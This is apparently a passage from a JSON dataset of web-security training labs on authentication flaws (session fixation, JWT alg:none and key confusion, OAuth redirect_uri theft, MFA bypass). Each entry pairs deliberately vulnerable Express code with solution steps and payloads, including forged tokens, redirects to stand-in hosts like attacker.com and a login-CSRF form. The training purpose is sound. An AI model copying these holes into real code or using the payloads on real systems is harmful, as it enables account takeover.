  "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('querystring'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'temp-code-abc123'; res.redirect(`${redirectUri}?code=${code}`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'temp-code-abc123') { res.json({ access_token: 'token-carlos-xyz' }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token-carlos-xyz') res.send('Carlos Account Access Granted'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
  "payloads": [
    "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://attacker.com/oauth-leak",
    "POST /token { code: 'temp-code-abc123' }",
    "Authorization: Bearer token-carlos-xyz"
  ]
},
  {
    "Lab scenario": "Session Fixation via Insecure Cookie Reuse in Login Flow",
    "Lab Description": "The application does not invalidate existing session cookies after successful login. An attacker can preset a session ID and force a victim to use it. Once the victim logs in, the attacker can hijack the session. To solve: hijack Carlos's session after fixing the session ID and triggering login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and note the session cookie",
      "Use Postman to preset the session cookie for the victim via social engineering",
      "Craft a phishing page that loads the app with the preset session ID",
      "Wait for the victim to log in, then reuse the fixed session ID",
      "Access /my-account with the stolen session cookie to verify access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'supersecure' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || Math.random().toString(36).substring(2); res.cookie('session', sessionId); res.send('<form method=\"POST\" action=\"/login\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') res.send('Sensitive account info'); else res.send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "GET /login with fixed session cookie",
      "Send fixed session cookie to victim",
      "Use fixed session cookie post-login to access /my-account"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Bypass in API Authorization Header",
    "Lab Description": "The app uses JWT for API auth but accepts `alg: none`, enabling tampering. JWTs are passed via Authorization header. To solve: forge a valid token for user 'admin' without needing the secret key.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use jwt.io or Postman to decode the token structure from Authorization header",
      "Modify payload sub field to 'admin' and alg to 'none'",
      "Remove the signature completely from the token",
      "Send the forged token in Authorization: Bearer header",
      "Access /admin-panel endpoint to confirm elevated access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'topsecret'; app.get('/admin-panel', (req, res) => { const auth = req.headers.authorization; const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none' || jwt.verify(token, secret)) { if (payload.payload.sub === 'admin') return res.send('Admin Panel Access'); } res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"sub\":\"admin\"}",
      "Token: base64(header).base64(payload). (no signature)"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Grant Token Stealing via Redirect Manipulation",
    "Lab Description": "The app uses OAuth implicit grant and reflects redirect URIs insecurely. An attacker can manipulate the redirect_uri to capture tokens. To solve: obtain Carlos’s access token and use it to access his account data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze the OAuth login URL using Burp to extract redirect_uri param",
      "Modify redirect_uri to attacker-controlled server",
      "Craft and send phishing URL to victim with altered redirect_uri",
      "Host listener on attacker server to capture token from URL fragment",
      "Replay the token in Authorization header to access victim's data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const token = 'token123-carlos'; const redir = `${redirect_uri}#access_token=${token}`; res.redirect(redir); }); app.get('/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123-carlos') res.send('Carlos data'); else res.send('Unauthorized'); }); app.listen(5000);",
    "payloads": [
      "redirect_uri=https://attacker.com/capture",
      "Capture access_token in fragment",
      "Authorization: Bearer token123-carlos"
    ]
  },
  {
    "Lab scenario": "JWT Key Confusion Exploit in Login Endpoint",
    "Lab Description": "The app uses asymmetric JWT but incorrectly allows verification with symmetric key, enabling key confusion attacks. To solve: sign a forged admin token with the public key as HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Grab original JWT token using Burp from login flow",
      "Inspect token to see RS256 usage",
      "Convert public key to PEM and use as HMAC secret",
      "Sign token using HS256 with payload: { sub: 'admin' }",
      "Use forged token to access /admin/dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.sub === 'admin') res.send('Admin dashboard'); else res.status(403).send('Forbidden'); } catch (e) { res.status(401).send('Invalid'); } }); app.listen(6000);",
    "payloads": [
      "HS256 token signed with PEM content as secret",
      "Header: {\"alg\":\"HS256\"}",
      "Payload: {\"sub\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Session ID Exposure in GraphQL Login Mutation",
    "Lab Description": "The GraphQL login mutation leaks verbose error info and returns session ID directly in response, enabling session prediction. To solve: predict session of 'carlos' and hijack it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send GraphQL mutation for login",
      "Observe session ID is static and tied to username",
      "Try login with your username and confirm session format",
      "Predict session ID for carlos using username + static salt",
      "Send session cookie to /profile and confirm account takeover"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sessions = {}; const users = { carlos: 'pass123' }; app.post('/graphql', (req, res) => { const { query } = req.body; const match = query.match(/login\\(username: \\\"(.*?)\\\", password: \\\"(.*?)\\\"\\)/); const [, username, password] = match; if (users[username] === password) { const sid = `${username}-sess123`; sessions[sid] = username; res.json({ data: { login: { session: sid }}}); } else res.json({ errors: [{ message: 'Invalid' }] }); }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.send('Denied'); }); app.listen(7000);",
    "payloads": [
      "session=carlos-sess123",
      "GraphQL query: mutation { login(username: \"carlos\", password: \"wrong\") }"
    ]
  },
  {
    "Lab scenario": "Session Fixation via OAuth Code Reuse in Redirect URI",
    "Lab Description": "OAuth login improperly accepts reused authorization codes. An attacker can authenticate as victim using replayed codes. To solve: obtain Carlos's code and reuse it post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Observe OAuth code in redirect_uri using Burp",
      "Capture Carlos's OAuth code via phishing",
      "Replay GET /callback?code=<carlos_code>",
      "App accepts reused code and logs attacker in as Carlos",
      "Access /dashboard and verify session hijack"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const validCodes = { 'authcode-carlos': 'carlos' }; const sessions = {}; app.get('/callback', (req, res) => { const user = validCodes[req.query.code]; if (user) { const sid = Math.random().toString(36); sessions[sid] = user; res.cookie('session', sid); res.send('Logged in'); } else res.status(400).send('Invalid code'); }); app.get('/dashboard', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]; if (user === 'carlos') res.send('Welcome Carlos'); else res.send('Access denied'); }); app.listen(8000);",
    "payloads": [
      "/callback?code=authcode-carlos",
      "Session cookie from reused code grants access"
    ]
  },
  {
    "Lab scenario": "JWT Expiry Manipulation in Authorization Header",
    "Lab Description": "JWT tokens are verified without checking the expiration claim. An attacker can craft expired tokens that are still accepted. To solve: generate expired token for 'admin' and access /admin-area.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture original token using Burp and decode with jwt.io",
      "Change 'sub' to 'admin' and 'exp' to a past timestamp",
      "Re-sign the token using known secret",
      "Send token in Authorization header",
      "Verify /admin-area is accessible despite expired token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'jwtkey'; app.get('/admin-area', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { ignoreExpiration: true }); if (decoded.sub === 'admin') res.send('Admin Access Granted'); else res.send('Access Denied'); } catch (e) { res.send('Invalid token'); } }); app.listen(9000);",
    "payloads": [
      "Payload: {\"sub\":\"admin\",\"exp\":1000}",
      "Sign with secret 'jwtkey'",
      "Authorization: Bearer <expired_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "The application allows users to authenticate via a login form but does not issue a new session ID upon successful login. Instead, it reuses the session ID issued before authentication. This enables session fixation. The application reflects session IDs in a predictable format. To solve: Fixate a session for the victim user and access their My Account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to log in with your own account and observe the Set-Cookie header",
      "Send a GET /login request without logging in and capture the pre-authentication session ID",
      "Craft a phishing link using this session ID and trick the victim to log in via it",
      "Once the victim logs in, reuse the fixed session ID to impersonate them",
      "Access /account with the fixed session to confirm takeover"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = { carlos: 'mypassword' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', express.urlencoded({ extended: false }), (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/account'); } else { res.send('Invalid'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(403).send('Login required'); }); app.listen(3000);",
    "payloads": [
      "GET /login HTTP/1.1 + Set session cookie + trick user to authenticate",
      "Use session ID: PHPSESSID=fixatedvalue"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion allowing token forgery",
    "Lab Description": "The backend validates JWTs using the 'alg' header in the token. It incorrectly accepts tokens with 'none' algorithm, skipping signature verification. To solve: Forge a valid-looking token for the user 'admin' and access their My Account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite when logging in as a normal user",
      "Decode the JWT using jwt.io or Postman and observe the 'alg' field",
      "Craft a token with 'alg':'none' and payload with {\"user\":\"admin\"}",
      "Remove the signature part and inject the new token into Authorization header",
      "Send GET /account with the forged token and validate access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const SECRET = 'secret'; app.use(require('body-parser').json()); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = decoded.payload.user; return res.send(`Welcome ${user}`); } try { const verified = jwt.verify(token, SECRET); res.send(`Welcome ${verified.user}`); } catch { res.status(403).send('Invalid'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer [forged-token]"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect during authorization",
    "Lab Description": "The OAuth flow uses a redirect_uri parameter that is not properly validated, allowing attackers to inject an external domain. This can be exploited to leak authorization codes. To solve: Capture an authorization code issued for the victim and log in to their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate the OAuth flow and intercept the authorization request in Burp",
      "Modify redirect_uri to an attacker-controlled domain",
      "Send the modified link to the victim via social engineering",
      "Capture the authorization code redirected to your server",
      "Use the code in POST /token to obtain an access token and access /account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const codes = {}; app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query; const code = 'authcode123'; codes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', express.urlencoded({ extended: false }), (req, res) => { const user = codes[req.body.code]; if (user) res.json({ access_token: `${user}-token` }); else res.status(400).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token') res.send('Welcome carlos'); else res.status(403).send('Denied'); }); app.listen(3000);",
    "payloads": [
      "GET /auth?client_id=xyz&redirect_uri=https://evil.com",
      "Captured code: authcode123",
      "POST /token with code=authcode123"
    ]
  },
  {
    "Lab scenario": "Session fixation via login CSRF vulnerability",
    "Lab Description": "The application is vulnerable to login CSRF. The session remains fixed after the victim logs in via a crafted form. To solve: Force the victim to log in with your session ID and access their account page using that session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit /login and get a fresh session ID via Burp",
      "Host an auto-submitting login form with victim credentials and set form action to /login",
      "Embed this form in a phishing page using an <iframe>",
      "Trick the victim to visit the phishing page, forcing them to log in with your session",
      "Use the fixed session ID to access /account as the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixate', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: false })); const users = { carlos: 'secret123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) req.session.user = username; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "<form action='http://vulnerable-site.com/login' method='POST'><input name='username' value='carlos'><input name='password' value='secret123'></form><script>document.forms[0].submit();</script>",
      "Reuse session ID: Cookie: session=attackerSession"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass via public key as HMAC key",
    "Lab Description": "The application uses asymmetric RSA to sign JWTs but mistakenly verifies tokens using the public key with the HMAC algorithm. To solve: Forge a token for 'admin' using RS256 public key with HS256 algorithm.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a token from /login using Burp",
      "Extract the public key from /jwks or embedded source",
      "Use jwt.io to forge a token with alg='HS256' and key = public key",
      "Set user='admin' in payload and sign with public key as HMAC secret",
      "Send token in Authorization header to /account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const verified = jwt.verify(token, pubKey); res.send(`Welcome ${verified.user}`); } catch { res.status(403).send('Forbidden'); } }); app.listen(3000);",
    "payloads": [
      "Header: { \"alg\": \"HS256\" }",
      "Payload: { \"user\": \"admin\" }",
      "Sign with public key using HMAC"
    ]
  },
  {
    "Lab scenario": "GraphQL endpoint leaking verbose JWT decoding errors",
    "Lab Description": "The GraphQL API performs JWT validation and returns verbose error messages on failure. These errors help brute-force or guess the signing key. To solve: Identify the key from error feedback and forge a token to access the victim's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send malformed JWTs via Postman to the /graphql endpoint",
      "Observe stack traces or signature mismatch errors in response",
      "Use jwt-hack tool to brute-force the secret from error messages",
      "Forge a JWT with 'admin' as username and sign using discovered secret",
      "Submit GraphQL query with forged Authorization token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const jwt = require('jsonwebtoken'); const app = express(); const SECRET = 'adminsecret'; const schema = buildSchema('type Query { hello: String }'); const root = { hello: (args, context) => { const token = context.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, SECRET); return `Welcome ${decoded.user}`; } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true, context: req }))); app.listen(3000);",
    "payloads": [
      "Send invalid signature token to /graphql",
      "Extract error: jwt signature invalid",
      "Forge token with {\"user\":\"admin\"} signed using 'adminsecret'"
    ]
  },
  {
    "Lab scenario": "Persistent session reuse in SOAP login API",
    "Lab Description": "The SOAP API returns session tokens that are valid indefinitely and reused across logins. These tokens can be harvested from logs or URLs. To solve: Reuse a captured token for the admin and access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a SOAP login request and inspect the XML response in Burp",
      "Harvest the <sessionToken> returned",
      "Replay the token via SOAP or REST using Authorization header",
      "Try token reuse for different users by modifying token value",
      "Access /account using a working token for admin"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text()); const tokens = { admin: 'admintoken123' }; app.post('/soap', (req, res) => { if (req.body.includes('<username>admin</username>') && req.body.includes('<password>adminpass</password>')) return res.send('<sessionToken>admintoken123</sessionToken>'); res.send('<error>Invalid</error>'); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'admintoken123') res.send('Welcome admin'); else res.status(403).send('Denied'); }); app.listen(3000);",
    "payloads": [
      "<soap><username>admin</username><password>adminpass</password></soap>",
      "Authorization: Bearer admintoken123"
    ]
  },
  {
    "Lab scenario": "JWT with static secret across users",
    "Lab Description": "The JWT implementation uses a hardcoded static secret, same for all users. An attacker can sign their own tokens once the key is known. To solve: Discover the shared secret and forge a token for 'admin'.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Log in and capture your JWT via Burp",
      "Use jwt.io to decode the token and observe claims",
      "Try common secrets (e.g., 'secret', 'jwtsecret') with jwt-cracker",
      "Once secret is guessed, forge a token for 'admin'",
      "Set Authorization header with forged token and access /account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const SECRET = 'jwtsecret'; app.get('/login', (req, res) => { const token = jwt.sign({ user: 'attacker' }, SECRET); res.send(token); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); res.send(`Welcome ${decoded.user}`); } catch { res.status(403).send('Invalid'); } }); app.listen(3000);",
    "payloads": [
      "Header: { \"alg\": \"HS256\" }",
      "Payload: { \"user\": \"admin\" }",
      "Secret: jwtsecret"
    ]
  },
  {
    "Lab scenario": "Session ID exposed in referrer header",
    "Lab Description": "The app sets session tokens in URLs for internal redirections. These URLs are leaked via the Referer header. To solve: Capture a valid session token via referrer and reuse it to access /account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Click a button that redirects to /account?sid=token123",
      "Inspect the Referer header from this request to another domain",
      "Harvest the session ID from the Referer",
      "Send a new request with Cookie: session=token123",
      "Confirm session hijack via access to /account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = { 'token123': 'carlos' }; app.get('/redirect', (req, res) => { res.redirect(`/account?sid=token123`); }); app.get('/account', (req, res) => { const sid = req.query.sid || req.cookies.session; const user = sessions[sid]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "GET /account?sid=token123",
      "Referer: http://vulnerable-site.com/account?sid=token123"
    ]
  },
{
  "Lab scenario": "Session Fixation via Unvalidated Token in REST Login Flow",
  "Lab Description": "The application implements a login system that uses a session ID passed via a query parameter to maintain state. However, the server fails to invalidate pre-authenticated session IDs. This leads to a session fixation vulnerability. The application allows attackers to fix the victim's session ID before they log in. To solve: hijack Carlos's session by setting a known session ID and forcing him to authenticate with it.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the login process and identify the sessionId parameter passed in the URL or as a cookie.",
    "2. Observe that the sessionId is accepted and reused across multiple requests before and after authentication.",
    "3. Use OWASP ZAP to replay a login request with a manually fixed sessionId (e.g., sessionId=attacker123).",
    "4. Craft a phishing email or CSRF link to trick Carlos into logging in using the fixed session ID.",
    "5. Once Carlos logs in, reuse the same session ID to access the /my-account endpoint and confirm access to Carlos’s session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'secure123' }]; app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); sessions[sessionId] = username; res.cookie('sessionId', sessionId).send('Logged in'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionId; const username = sessions[sessionId]; if (username) { res.send('Account details for ' + username); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
  "payloads": [
    "/login?username=carlos&password=secure123&sessionId=attacker123",
    "Cookie: sessionId=attacker123",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Forgery in GraphQL Auth Token",
  "Lab Description": "The application uses JWT for GraphQL authentication but fails to validate the token algorithm properly. The `alg` field is user-controlled and defaults to `none` if missing or set improperly. The application signs JWTs with a symmetric key but trusts tokens without signatures when `alg` is set to `none`. To solve: craft a JWT with `alg:none` and impersonate Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to inspect a valid JWT returned after logging in.",
    "2. Decode the JWT and observe the `alg` header and the payload containing the username.",
    "3. Modify the JWT header to {\"alg\":\"none\"} and set the payload to {\"username\":\"carlos\"}.",
    "4. Remove the signature part completely and send the modified token in the Authorization header using GraphQL.",
    "5. Query a protected field such as getAccountDetails in the /graphql endpoint and verify access as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload.username; } else { try { const verified = jwt.verify(token, SECRET); req.user = verified.username; } catch { return res.status(403).send('Invalid token'); } } if (req.body.query.includes('getAccountDetails')) { res.send({ data: { account: req.user } }); } else { res.status(400).send('Unsupported query'); } }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\"}",
    "JWT: base64url(header) + '.' + base64url(payload) + '.'",
    "Authorization: Bearer [forged_token]",
    "POST /graphql { \"query\": \"{ getAccountDetails { name } }\" }"
  ]
},
{
  "Lab scenario": "OAuth Client Misconfiguration via Redirect URI Manipulation",
  "Lab Description": "The application integrates OAuth for third-party login but improperly validates the `redirect_uri` parameter. This allows an attacker to manipulate the URI to a domain they control. By injecting a malicious redirect URI, the attacker can capture a valid authorization code. To solve: obtain Carlos's access token using a manipulated `redirect_uri` and access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to capture the OAuth login redirection request, especially the authorization code request.",
    "2. Observe that the `redirect_uri` parameter is not validated strictly against registered URIs.",
    "3. Change the redirect_uri parameter to point to your attacker-controlled server and resend the request.",
    "4. Once the victim logs in and authorizes the app, capture the authorization code from your server logs.",
    "5. Exchange the stolen code for an access token, and use Postman to send it in a request to /profile to confirm Carlos’s access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const clients = [{ client_id: 'trustedApp', redirect_uri: 'http://localhost:4000/callback' }]; const codes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, username } = req.query; const code = 'authcode123'; codes[code] = username; res.redirect(redirect_uri + '?code=' + code); }); app.post('/token', (req, res) => { const { code } = req.body; const user = codes[code]; if (user) { const token = 'token-' + user; tokens[token] = user; res.send({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) { res.send('Profile of ' + user); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
  "payloads": [
    "GET /authorize?client_id=trustedApp&redirect_uri=http://attacker.com/callback&username=carlos",
    "Intercepted code: authcode123",
    "POST /token { code: authcode123 }",
    "Authorization: Bearer token-carlos",
    "GET /profile"
  ]
},
{
  "Lab scenario": "OAuth session fixation in authentication callback",
  "Lab Description": "This lab implements OAuth-based login and contains a session fixation vulnerability. The application fails to generate a new session ID after OAuth login. An attacker can set their session ID prior to the victim's login and hijack their session post-login. To solve: hijack Carlos's account by pre-fixing a session and accessing his account page after login.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to capture the login OAuth flow starting at /auth/login and observe the session cookie",
    "Send GET /auth/login to Burp Repeater, inject a custom session cookie (e.g., attacker-session=xyz123)",
    "Use an iframe or trick to force Carlos to log in using the same session value",
    "After Carlos completes OAuth login, reuse the attacker-session cookie and access /my-account",
    "Confirm successful session fixation by viewing Carlos's account page"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = { carlos: { role: 'user' } }; app.get('/auth/login', (req, res) => { res.redirect('/auth/callback?token=fake-oauth-token'); }); app.get('/auth/callback', (req, res) => { const token = req.query.token; if (token === 'fake-oauth-token') { req.session.user = 'carlos'; res.redirect('/my-account'); } else { res.status(401).send('OAuth failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Welcome ' + req.session.user); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
  "payloads": [
    "Cookie: attacker-session=xyz123",
    "GET /auth/login with predefined session cookie",
    "GET /my-account using stolen session ID"
  ]
},
{
  "Lab scenario": "JWT signature confusion in REST API",
  "Lab Description": "This lab uses a JWT-based authorization mechanism and is vulnerable to signature confusion via the 'none' algorithm. The application accepts JWTs with the 'alg' field set to 'none' and does not verify the signature. To solve: craft a forged token that impersonates Carlos and access the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture the login request using Postman or Burp and extract the JWT from Authorization: Bearer header",
    "Use jwt.io or manual decoding to inspect the payload",
    "Create a modified JWT with 'alg':'none' and 'sub':'carlos'",
    "Remove the signature entirely and send the token in Authorization header",
    "Access /admin/dashboard with the forged token and verify admin access"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'topsecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username, role: 'user' }, secret); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.sub === 'carlos') return res.send('Admin access granted'); } jwt.verify(token, secret); res.status(403).send('Invalid token'); } catch { res.status(403).send('Error processing token'); } }); app.listen(3000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ.",
    "Authorization: Bearer [none-alg token]",
    "GET /admin/dashboard"
  ]
},
{
  "Lab scenario": "MFA bypass due to logic flaw in SOAP endpoint",
  "Lab Description": "This lab uses SOAP-based login with MFA verification. The backend fails to verify the MFA token when a specific debug header is set. This can be exploited to bypass 2FA entirely. To solve: log in as Carlos without knowing the MFA code by bypassing the second step using the debug header.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use OWASP ZAP to intercept the SOAP request to /soap/login",
    "Observe the two-step process: login and then verifyMFA via SOAP actions",
    "Resend the verifyMFA SOAP request with header Debug-Bypass: true",
    "Modify the username to Carlos and skip sending the token",
    "Confirm access by sending a getAccountDetails SOAP request"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); const users = { carlos: { password: 'pass123', mfa: '000999' } }; app.post('/soap/login', (req, res) => { const xml = req.body; if (xml.includes('<action>login</action>')) { res.send('<response>Login success. Send MFA token.</response>'); } else if (xml.includes('<action>verifyMFA</action>')) { if (req.headers['debug-bypass'] === 'true') return res.send('<response>Access granted (debug bypass)</response>'); if (xml.includes(users.carlos.mfa)) return res.send('<response>Access granted</response>'); res.status(403).send('<response>Invalid token</response>'); } }); app.listen(3000);",
  "payloads": [
    "SOAPAction: verifyMFA + Header: Debug-Bypass: true",
    "<soap><action>verifyMFA</action><user>carlos</user></soap>",
    "POST /soap/login with spoofed SOAP payload"
  ]
},
  {
    "Lab scenario": "JWT signature trust confusion in multi-algorithm implementation",
    "Lab Description": "The application uses JSON Web Tokens (JWT) to manage user sessions and supports multiple algorithms for signature verification. It mistakenly treats 'none' algorithm as valid when certain conditions are met, due to a flawed library wrapper. The application validates tokens signed with 'HS256' and mistakenly trusts unsigned tokens if the header is manipulated. To solve: craft a valid unsigned JWT granting admin privileges and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT from a login session.",
      "Send the JWT to Burp Decoder and modify the alg field in the header to 'none'.",
      "Remove the signature section entirely from the token.",
      "Change the payload to {\"user\":\"admin\"}.",
      "Send the token in Authorization: Bearer <token> and access /admin to verify successful privilege escalation."
    ],
    "Vulnerability name": "Authentication",
